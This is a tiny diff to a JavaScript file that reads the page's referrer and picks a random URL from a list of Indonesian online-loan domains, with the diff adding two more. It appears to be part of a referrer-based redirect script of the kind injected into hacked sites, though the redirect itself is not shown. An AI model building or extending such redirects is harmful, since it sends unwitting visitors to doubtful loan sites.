@@ -4,8 +4,10 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
+							'https://pinjam.123uver.cz',
 							'https://pinjamanonline.my.id',
 							'https://wang.my.id',
+							'https://pinjamwang.my.id',
 							]);
 
 				function rChoice(arr) {
